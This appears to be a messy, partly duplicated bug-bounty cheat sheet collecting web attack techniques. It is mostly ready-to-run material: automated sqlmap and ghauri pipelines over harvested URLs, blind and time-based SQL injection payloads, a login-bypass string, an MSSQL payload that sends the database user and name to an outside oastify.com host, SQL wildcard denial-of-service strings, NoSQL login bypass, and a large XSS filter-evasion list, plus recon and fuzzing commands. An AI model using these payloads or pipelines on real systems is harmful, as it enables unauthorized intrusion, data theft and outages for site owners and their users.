  ghauri -u https://www.site.com/vuln.php?id=1  -p id --prefis "' or 1=1 --" --ssuffix "#"
  
   with tread
    ghauri -u https://www.site.com/vuln.php?id=1 --threads 5
     Custom Detection Criteria with HTTP Code:
       ghauri -u https://www.site.com/vuln.php?id=1  --code 200 --string "welcome"
       
       
    tip                              check more on this write up     https://infosecwriteups.com/i-earned-3500-and-40-points-for-a-graphql-blind-sql-injection-vulnerability-5b7e428c477d  
    whenever you encounter internal server error while testing sql,  validate by sending by sending sql paylaod                        XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z                or 
   payload 14)%20AND%20(SELECT%207415%20FROM%20(SELECT(SLEEP(10)))CwkU)%20AND%20(7515=7515  and test sqli on every sql query and also check the bytes
 
#tip  
 payload 14)%20AND%20(SELECT%207415%20FROM%20(SELECT(SLEEP(10)))CwkU)%20AND%20(7515=7515
 xxx'-cast((select CASE WHEN ((MY_QUERY) like 'CHAR_TO_BRUTE_FORCE%25') THEN (sleep(1)) ELSE 2 END) as char)-'

 
 #TIP
 SQL injection Oneliner.




   #ONE-LINER
   SQLI ONE LINER:-     SQLI ONE LINER:-     SQLI ONE LINER:-
   
   sqlmap -u 'h t t p :// domain[.]com / anyfile.asp?id_test=8%20or%207250%3d07250' --dbs --random-agent ignore=500 - -code=200 -T tablename --columns -- no-cast
   
   
cat target.com | waybackurls | grep "?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt

subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt

grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"

  subfinder -d site.com -all -silent | waybackurls | sort -u | gf sqli > gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
  
  
 #tip
  Do you know that sqlmap has its own crawler? Run in the background easily:
sqlmap -u 'https://target\.com' --crawl=3 --random-agent --batch --forms --threads=5 --hostname --timeout=15 --retries=1 --time-sec 12
  
  Found SQL Injection to Account Takeover Manually :) 
1. Enter mobile number to login intercept
{"mobile_number":"8888888888"} >> 200
{"mobile_number":"8888888888'"} >> 500
{"mobile_number":"8888888888''"} >> 200
  
  
  #Time-based-SQL-injection
  cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
  
  #tip
  if The target is running the Postgres SQL server put the Unicode char  "\u0000"  and see the magic 😄
note:  this can break the database
  
  
  
   SQL ERROR
 POST /updateUser
 Host: example.com

 user_id=1338&name=test
 
 If you were to provide user_id=1338-1 and it was vulnerable, then the code would execute against user_id=1337. The code

$sql = "UPDATE users SET name='test' WHERE id='1338-1'"; will be executed as being user id 1337


   #tip
   stumbled on subdomain giving 403    example legacypanel.redacted.com
   added a path to it and watch the response 
   legacypanel.redacted.com/dummy, check the response to check if it gives 404
   indicating 404 means that the 403 restriction was only applied on the main domain and not on other paths.
   fuzz and bruteforce  to get other paths and get the register box
   1234’ %2F%2A%2A%2FAnd%2F%2A%2A%2Fsleep(5)   on the resgiter page /// try other bypass if blocked by waf
   
  


   
    #ONE-LINER
   SQLI ONE LINER:-     SQLI ONE LINER:-     SQLI ONE LINER:-
   
     
   
cat target.com | waybackurls | grep "?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt

subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt

grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"

  subfinder -d site.com -all -silent | waybackurls | sort -u | gf sqli > gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
 
 
 subfinder -dL domains.txt | dnsx | waybackurl | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1

grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"

    TIME-BASE SQL INJECTION
gau DOMAIN.tld  | sed 's/=[^=&]*/=YOUR_PAYLOAD/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done


waybackurls http://TARGET.COM | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt 

 '"<svg/onload=prompt(5);>{{7*7}}
 
 



Exploitation of mssql injection
By appending the value ‘“”) to the parameter, I triggered an error revealing that the table name was too long, indicating the presence of a SQL injection vulnerability. Further refining the injection payload, I successfully balanced the query to execute arbitrary commands. For instance:

“https://evil.com/path/test.aspx?fuzz=1')--+-"
“https://evil.com/path/test.aspx?fuzz=1') and 1=@@version — +-


  
#TIP
Find SQLi using Jeeves
echo "http://exampl.com" | gf sqli | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 10

  #tip
  If you find sql injection and encounter a 403 or waf block, be sure to try tamper scripts and update your sqlmap
Payload ; 
sqlmap -r req.txt --risk 3 --level 3 --dbs --tamper=space2comment,space2morehash


#tips
  Step 1: Go admin login page                        https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt

Step 2: Now enter the payload in the username or password field,

Payload Used: admin’ or ‘1’=’1'#

Step 3: Enter the payload and click the submit button.

Step 4 : Booooom!!! You Login successfully…




 SQLI Oneliner With Sqlmap:
1 subfinder -d target.com|tee -a domains.txt
2 cat domains.txt|httpx|tee -a urls-alive.txt
3 cat urls-alive.txt|waybackurls|tee -a urls-check.txt
4 gf sqli urls-check.txt >> sql.url
5 sqlmap -m sql.url --dbs --batch





 TOP XOR BLIND PAYLOADS 
 '%3bWAITFOR+DELAY+'00%3a00%3a5'--

0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X

0"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z

'XOR(if((select now()=sysdate()),sleep(10),0))XOR'Z

X'XOR(if(now()=sysdate(),//sleep(5)//,0))XOR'X

X'XOR(if(now()=sysdate(),(sleep((((5))))),0))XOR'X

X'XOR(if((select now()=sysdate()),BENCHMARK(1000000,md5('xyz')),0))XOR'X

'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z

(SELECT(0)FROM(SELECT(SLEEP(6)))a)

'XOR(if(now()=sysdate(),sleep(5*5),0))OR'

'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'

(SELECT * FROM (SELECT(SLEEP(5)))a)

'%2b(select*from(select(sleep(5)))a)%2b'

CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END

');(SELECT 4564 FROM PG_SLEEP(5))--

["')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE//5//%23"]

DBMS_PIPE.RECEIVE_MESSAGE(%5BINT%5D,5)%20AND%20%27bar%27=%27bar

AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar

1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK

(select*from(select(sleep(20)))a)

'%2b(select*from(select(sleep(0)))a)%2b'

*'XOR(if(2=2,sleep(10),0))OR'
-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//

'+(select*from(select(if(1=1,sleep(20),false)))a)+'"

2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)

BENCHMARK(10000000,MD5(CHAR(116)))

'%2bbenchmark(10000000%2csha1(1))%2b'

'%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep(5),1)))a)--%20 - true

polyglots payloads:

if(now()=sysdate(),sleep(3),0)/'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"/

if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0) and 1=1)"/ 



    
    Accept: "' or sleep(30)='" 
Accept-Charset: "' or sleep(30)='" 
Accept-Datetime: "' or sleep(30)='" 
Accept-Encoding: "' or sleep(30)='" 
Accept-Language: "' or sleep(30)='" 
Authorization: "' or sleep(30)='" 
Cache-Control: "' or sleep(30)='" 
Connection: "' or sleep(30)='" 
Content-Length: "' or sleep(30)='" 
Content-MD5: "' or sleep(30)='" 
Content-Type: "' or sleep(30)='" 
Cookie: "' or sleep(30)='" 
Date: "' or sleep(30)='" 
Expect: "' or sleep(30)='" 
Forwarded: "' or sleep(30)='" 
From: "' or sleep(30)='" 
If-Match: "' or sleep(30)='" 
If-Modified-Since: "' or sleep(30)='" 
If-None-Match: "' or sleep(30)='" 
If-Range: "' or sleep(30)='" 
If-Unmodified-Since: "' or sleep(30)='" 
Max-Forwards: "' or sleep(30)='" 
Origin: "' or sleep(30)='" 
Pragma: "' or sleep(30)='" 
Proxy-Authorization: "' or sleep(30)='" 
Range: "' or sleep(30)='" 
Referer: "' or sleep(30)='" 
TE: "' or sleep(30)='" 
Upgrade: "' or sleep(30)='" 
User-Agent: "' or sleep(30)='" 
Via: "' or sleep(30)='" 
Warning: "' or sleep(30)='" 
X-Client-IP: "' or sleep(30)='" 
X-Remote-IP: "' or sleep(30)='" 
X-Remote-Addr: "' or sleep(30)='" 
X-Forwarded-For: "' or sleep(30)='" 
X-Originating-IP: "' or sleep(30)='" 
X-Host: "' or sleep(30)='"
X-Forwarded-Host: "' or sleep(30)='"


   tip
   Whenever you inject a sqli  , and it returns 200, always compare  the response on compare  with the former 200, to check for blind sqli.  Clue from tiberius


  subfinder -d target[.]com -all -silent | hakrawler | urldedupe |gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 1 --level 5 --random-agent | tee -a sqli.txt
  
  payloads
     admin';IF(97=97) WAITFOR DELAY '0:0:5' --820&TBPassword=
     
     admin'%3bIF(97=97)%20TAITFOR%20DELAY%20'0%3A0%3A5' --820&TBPassword=
     
admin';DECLARE @a varchar(1024);DECLARE @b varchar(1024);SELECT @a = (SELECT system_user);SELECT @b = (SELECT DB_NAME());EXEC('master..xp_dirtree "\\%c%' + @a + ' ' + '.' + '2svs73it2s6bhy1r9pghdhdhdh.oastify.com\test$"');--


     

  
  
  tip
  always test sqli in parallel in any json object
  
  
  tip
  you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.

These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT:
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>

  NOTE
   For a UNION query to work, two key requirements must be met:

    The individual queries must return the same number of columns.
    The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:

    How many columns are being returned from the original query.
    Which columns returned from the original query are of a suitable data type to hold the results from the injected query.
    
    Determining the number of columns required
                 injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs.
                 The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values: 
                 
                 
    NOTE 
    Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL , this involves using burp collaborator or ooast 


    tip
    Whenever you inject a sqli  , and it returns 200, always compare  the response on compare  with the former 200, to check for blind sqli.  Clue from tiberius


       SQL-WILDCARD-DOS-   
        
       this is possible on every search fuction and also file upload features in wep app   
                        https://shahjerry33.medium.com/sql-wildcard-dos-hang-till-death-adbae66d1f7b
       SQL Wildcard DoS is about forcing the database to carry out CPU-intensive queries by using several wildcards
       
       
       steps
   go to     file upload feature
   uploaded a normal text file with the name Test2.txt
   intercepted the request and sent it to repeater for checking a normal response time
    Then change the file name to SQL Wildcard DoS payload: %n[^n]y[^j]l[^k]d[^l]h[^z]t[^k]b[^q]t[^q][^n]!%.txt and checked the response time
    visited the page where the files were being uploaded and the page was not available
    
    
    Sample Payloads

1  ‘%_[^!_%/%a?F%_D)_(F%)_%([)({}%){()}£$&N%_)$*£()$*R”_)][%](%[x])%a][$*”£$-9]_%’
2   ‘%64_[^!_%65/%aa?F%64_D)_(F%64)_%36([)({}%33){()}£$&N%55_)$*£()$*R”_)][%55](%66[x])%ba][$*”£$-9]_%54’ (bypasses mod-security)
3    _[r/a)_ _(r/b)_ _(r-d)_
4   %n[^n]y[^j]l[^k]d[^l]h[^z]t[^k]b[^q]t[^q][^n]!%
5     %_[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[! -z]@$!_%
6    '%%%%'
       
       
       
       tips  on sql injection                               https://x.com/bugoverfl0w/status/1751641500751139115
       while browser I found a request, it is POST request with data JSON

{"userName":"0a"} => response {"Exception":"No entity found for query"}
Confirm SQLi by add ' after 0a
{"userName":"0a'"}

    Got response {"Exception":"org.hibernate.exception.SQLGrammarException: could not prepare statement"}  
If I add ' or -- after 0a' => response like first request 
=> confirm SQLI now try to find backend database  Next req:
{"userName":"0a' or 1=1--"}
       
  
  
       NOSQL INJECTION      NOSQL INJECTION       NOSQL INJECTION 

POST /login HTTP/1.1 Host: vuln.lab Content-Type: application/json {“username”: “admin”,”password”: “mypass”}

In order to test if the login is vulnerable to NoSQL injection, we can supply a JSON input object as follows:
POST /login HTTP/1.1 Host: vuln.lab Content-Type: application/json {“username”: “admin”,”password”: {‘$gt’: “”}} In cases where the application doesn’t use JSON as input, it’s still possible to inject an input object by passing an array object in the parameters request, as shown below:
POST /login HTTP/1.1 Host: vuln.lab Content-Type: application/x-www-form-urlencoded user=admin&password[$ne]=


 In both the above cases, we’re able to bypass the login and access the application
       
       
     tip
     Add parameters like $lookup, $unionWith, and $match to your wordlist for testing. Any errors or hits on these might give a hint to a potential NoSQL injection.
       
                 
                 
                 CR/LF (Carriage Return/Line Feed) Injection       CR/LF (Carriage Return/Line Feed) Injection

CR/LF (Carriage Return/Line Feed) injection is a type of security vulnerability. CR/LF refers to a sequence of two ASCII control characters: Carriage Return (CR, ASCII code 13) and Line Feed (LF, ASCII code 10). These characters are used in text files to signify the end of a line and control the positioning of the cursor or print head when displaying or printing text. CR/LF injection vulnerabilities occur when attackers insert CR/LF characters into input fields, file extensions or file uploads to manipulate application behavior. This can lead to exploits such as altering headers, injecting malicious code, or manipulating file content.
                 
                 
                 

Open Redirect:-
Open Redirection OneLiner :-

waybackurls tesorion.nl | grep -a -i =http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
httpx -l i.txt -path "///evil.com" -status-code -mc 302
 

HTTPX scanning a guide

scanning using HTTPX and detecting techs running the page
echo "http://testphp.vulnweb.com" | httpx
echo "(url)" | httpx

Subdomain enum using subfinder and scan using HTTPX
subfinder -d vulnweb.com | httpx -title -status-code -tech-detect -follow-redirects


echo "http://google.co.in" | httpx -sc -cl -ct -location

echo "https://shodan.io" | httpx -probe -ip -cdn
echo "http://testphp.vulnweb.com" | httpx -lc -wc
echo "http://testphp.vulnweb.com" | httpx -debug

echo "http://hackerone.com" | httpx -pa -probe

echo "http://testphp.vulnweb.com" | httpx -probe -sc -path "/login.php"

sql injection in httpx
echo "http://testphp.vulnweb.com" | httpx -path "/listproducts.php?cat=1’" -ms "Error: You have an error in your SQL syntax;"

for xss injection

echo "http://testphp.vulnweb.com" | httpx -path "/listproducts.php?cat=<script>alert(1)</script>" -ms "<script>alert(1)</script>"

for login
echo "http://testphp.vulnweb.com" | httpx -debug-resp -x post -path "/userinfo.php" -H "Cookie: login=test%2Ftest" -body "uname=test&pass=test"

run through proxy
echo "http://testphp.vulnweb.com" | httpx -x all -probe -http-proxy http://127.0.0.1:8080

subfinder -d hackerone.com | httpx -timeout 10 | katana -proxy http://127.0.0.1:8080 -jc -aff 


FUFF SCANING " A DETAILED GUIDE"
simple attack
ffuf -u http://testphp.vulnweb.com/FUZZ/ -w dict.txt
     content discovery
ffuf -u http://localehost/FUZZ -w user/share/seclists/Diiscovery/web-content/common.txt


with burpsuite request 
ffuf -c -w ./wordlist.txt -u https://ffuf.io.fi/fuzz -replay-proxy http:localhost:8080

muitiple wordlist attack
ffuf -u https://ignitetechnologies.in/W2/W1/ -w dict.txt:W1 -w dns_dict.txt:W2

searching for specific extension
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -e .php

working on sql injection
ffuf -request brute.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w pass.txt:WFUZZ -mc 200
the brute.txt was developed by burp during interception, whereby Put HFUZZ in front of uname and WFUZZ in front of the pass.then procced using cluster bumb .... //check fuff doc in hackingarticles

filter code
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -fc 302      filter code
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -fs 2929      filter size

MAXIMUN TIME
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -fs 2929

verbose mode 
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -v

treads mode
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -t 1000


ATTACK WITH COOKIES
ffuf -u http://192.168.1.12/dvwa/FUZZ/ -w dict.txt -b "PHPSESSID:"7aaaa6d88edcf7cd2ea4e3853ebb8bde""
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -u  (url/ IP) -H 'Origin: http://FUZZ.crossfit.htb' -mr "Access-Control-Allow-Origin" -ignore-body



#https://github.com/codingo/VHostScan
VHostScan -t example.com


check the appas a consumer anddd strike payload according to laugauage and application used

check for objecct tools --dev tools(chrome)

check for authentictaion like useername ,Email,oauth,mfA

CHECK FOR OPEN PORT TOOLS MASSCAN, PORT COMMONLY USED 80, 441, 81
DIG,WHOIS,WHATWEB,MAP

SUDDOMMAIN ENUM and new parameter

ARUJUN, DIRB,NUCLEAR,gobuster




curl https://jldc.me/anubis/subdomains/tesla.com | jq -r ".[]"

dnsrecon -a -d floqast.com  

puredns bruteforce all.txt domain.com


assetfinder --subs-only <domain>
/subfinder-linux-amd64 -d tesla.com [-silent]


dnsrecon -r <DNS Range> -n <IP_DNS>   #DNS reverse of all of the addresses
dnsrecon -d facebook.com -r 157.240.221.35/24 #Using facebooks dns
dnsrecon -r 157.240.221.35/24 -n 1.1.1.1 #Using cloudflares dns
dnsrecon -r 157.240.221.35/24 -n 8.8.8.8 #Using google dns




in the broswer dns

ffuf -c -w /path/to/wordlist -u http://victim.com -H "Host: FUZZ.victim.com"



gobuster vhost -u https://mysite.com -t 50 -w subdomains.txt

wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.example.com" -u http://example.com -t 100

subfinder -d hackerone.com | httpx -timeout 10 | katana -proxy http://127.0.0.1:8080 -jc -aff 




#https://github.com/codingo/VHostScan
VHostScan -t example.com


screenshoot tools
eyewitness , htttpscreenshot, shutter


EXPOLIT DB

HOW IS THE SESSION ESTABLISHED TOOLS -> devtools-> storage -> session

check for code reveiw

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/code-review-tools
https://app.snyk.io/



check for minor framwork and app use and payload the framework

ask how does it handle sspecial characters

how is user idntify





check for api
If you are attacking the /api/v3/sign-up endpoint try to perform bruteforce to /Sing-up, /SignUp, /singup...
Also try appending to the original endpoint bytes like %00, %0d%0a, %0d, %0a, %09, %0C, %20



is capcha used

does the site allow for user impersoniation , sensitive information being used, check idf websocket are used

is cors implemented
can you uplaod files  
check for owasp toplist


does the site allows for webhook url 

what htpp request are made

validate csrf token

open redirect xss 

check vulnerabilities in series

check for takeways when testin a vulnerabilities
     
     
     
  A ghetto collection of XSS payloads that I find to be useful during penetration tests, especially when faced with WAFs or application-based black-list filtering, but feel free to disagree or shoot your AK-74 in the air.
                                                                                                        
Simple character manipulations.  
Note that I use hexadecimal to represent characters that you probably can't type.  For example, \x00 equals a null byte, but you'll need to encode this properly depending on the context (URL encoding \x00 = %00).

HaRdc0r3 caS3 s3nsit1vITy bYpa55!
<sCrIpt>alert(1)</ScRipt>
<iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)>

Null-byte character between HTML attribute name and equal sign (IE, Safari).
<img src='1' onerror\x00=alert(0) />

Slash character between HTML attribute name and equal sign (IE, Firefox, Chrome, Safari).
<img src='1' onerror/=alert(0) />

Vertical tab between HTML attribute name and equal sign (IE, Safari).
<img src='1' onerror\x0b=alert(0) />

Null-byte character between equal sign and JavaScript code (IE).
<img src='1' onerror=\x00alert(0) />

Null-byte character between characters of HTML attribute names (IE).
<img src='1' o\x00nerr\x00or=alert(0) />

Null-byte character before characters of HTML element names (IE).
<\x00img src='1' onerror=alert(0) />

Null-byte character after characters of HTML element names (IE, Safari).
<script\x00>alert(1)</script>

Null-byte character between characters of HTML element names (IE).
<i\x00mg src='1' onerror=alert(0) />

Use slashes instead of whitespace (IE, Firefox, Chrome, Safari).
<img/src='1'/onerror=alert(0)>

Use vertical tabs instead of whitespace (IE, Safari).
<img\x0bsrc='1'\x0bonerror=alert(0)>

Use quotes instead of whitespace in some situations (Safari).
<img src='1''onerror='alert(0)'>
<img src='1'"onerror="alert(0)">

Use null-bytes instead of whitespaces in some situations (IE).
<img src='1'\x00onerror=alert(0)>

Just don't use spaces (IE, Firefox, Chrome, Safari).
<img src='1'onerror=alert(0)>

Prefix URI schemes.
Firefox (\x09, \x0a, \x0d, \x20)
Chrome (Any character \x01 to \x20)
<iframe src="\x01javascript:alert(0)"></iframe> <!-- Example for Chrome -->

No greater-than characters needed (IE, Firefox, Chrome, Safari).
<img src='1' onerror='alert(0)' <

Extra less-than characters (IE, Firefox, Chrome, Safari).
<<script>alert(0)</script>

Backslash character between expression and opening parenthesis (IE).
<style>body{background-color:expression\(alert(1))}</style>

JavaScript Escaping
<script>document.write('<a hr\ef=j\avas\cript\:a\lert(2)>blah</a>');</script>

Encoding Galore.

HTML Attribute Encoding
<img src="1" onerror="alert(1)" />
<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
<iframe src="javascript:alert(1)"></iframe>
<iframe src="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"></iframe>

URL Encoding
<iframe src="javascript:alert(1)"></iframe>
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>

CSS Hexadecimal Encoding (IE specific examples)
<div style="x:expression(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))">Joker</div>
<div style="x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029">Joker</div>

JavaScript (hexadecimal, octal, and unicode)
<script>document.write('<img src=1 onerror=alert(1)>');</script>
<script>document.write('\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x31\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x61\x6C\x65\x72\x74\x28\x31\x29\x3E');</script>
<script>document.write('\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076');</script>
<script>document.write('\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0031\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E');</script>

JavaScript (Decimal char codes)
<script>document.write('<img src=1 onerror=alert(1)>');</script>
<script>document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,49,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,48,41,62));</script>

JavaScript (Unicode function and variable names)
<script>alert(123)</script>
<script>\u0061\u006C\u0065\u0072\u0074(123)</script>

Overlong UTF-8 (SiteMinder is awesome!)
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2

<img src="1" onnerror="alert(1)">
%E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE

UTF-7 (Missing charset?)
<img src="1" onerror="alert(1)" />
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-

Unicode .NET Ugliness
<script>alert(1)</script>
%uff1cscript%uff1ealert(1)%uff1c/script%uff1e

Classic ASP performs some unicode homoglyphic translations... don't ask why...
<img src="1" onerror="alert('1')">
%u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A

Useless and/or Useful features.

HTML 5 (Not comphrensive)
<video src="http://www.w3schools.com/html5/movie.ogg" onloadedmetadata="alert(1)" />
<video src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)" />

Usuage of non-existent elements (IE)
<blah style="blah:expression(alert(1))" />

CSS Comments (IE)
<div style="z:exp/*anything*/res/*here*/sion(alert(1))" />

Alternate ways of executing JavaScript functions
<script>window['alert'](0)</script>
<script>parent['alert'](1)</script>
<script>self['alert'](2)</script>
<script>top['alert'](3)</script>

Split up JavaScript into HTML attributes
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>

HTML is parsed before JavaScript
<script>
var junk = '</script><script>alert(1)</script>';
</script>

HTML is parsed before CSS
<style>
body { background-image:url('http://www.blah.com/</style><script>alert(1)</script>'); }
</style>

XSS in XML documents [doctype = text/xml] (Firefox, Chrome, Safari).
<?xml version="1.0" ?>
<someElement>
	<a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(1)'/></a>
</someElement>

URI Schemes
<iframe src="javascript:alert(1)"></iframe>
<iframe src="vbscript:msgbox(1)"></iframe> (IE)
<iframe src="data:text/html,<script>alert(0)</script>"></iframe> (Firefox, Chrome, Safari)
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe> (Firefox, Chrome, Safari)

HTTP Parameter Pollution
http://target.com/something.xxx?a=val1&a=val2
ASP.NET 	a = val1,val2
ASP 		a = val1,val2
JSP 		a = val1
PHP 		a = val2

Two Stage XSS via fragment identifier (bypass length restrictions / avoid server logging)
<script>eval(location.hash.slice(1))</script>
<script>eval(location.hash)</script> (Firefox)

http://target.com/something.jsp?inject=<script>eval(location.hash.slice(1))</script>#alert(1)

Two Stage XSS via name attribute
<iframe src="http://target.com/something.jsp?inject=<script>eval(name)</script>" name="alert(1)"></iframe>

Non-alphanumeric crazyness...
<script>
$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();
</script>




chat gpt for bountities
 to use bruteforce enumerartion with amass to list ip addresses
 
 
 
 


Bash
amass intel brute -w /path/to/wordlist.txt -d example.com

amass intel brute -min-for-brute 3 -w /path/to/wordlist.txt -d example.com

  amass + nuclei
  amass intel -d "$domain" > subdomain.txt
amass intel brute -w /path/to/wordlist.txt -d example.com > subdomain.txt
nuclei -t templates/subdomain-takeover.yaml -1 subdomains.txt

 sudomain with jsubfinder + httpx
 jsubfinder -d example.com
 httpx -follow-redirects -threads 100 -timeout 5s -c 200 -silent -o results.txt subdomains.txt            for live subdomain
 
 
 using FFuf to finding RCE
 ffuf -w payloads.txt -u http://example.com/path/q-FUZZ 
 ffuf -w payloads.txt -u http://example.com/path/q-FUZZ -c 200,204,301,302

 ffuf -w payloads.txt -u http://example.com/path/q-FUZZ -c 200,204,301,302 -cs "command excuted successfully"
 
   full account takeover techniques in API/register
   
   using subjs , anew, and httpx to search for js domain
   subjs -silent  threads 10 -source  anew  example.com |  anew |  httpx  -silent threads 10   -status-code  200
   
   using shodan and nuclei to scanning host
   
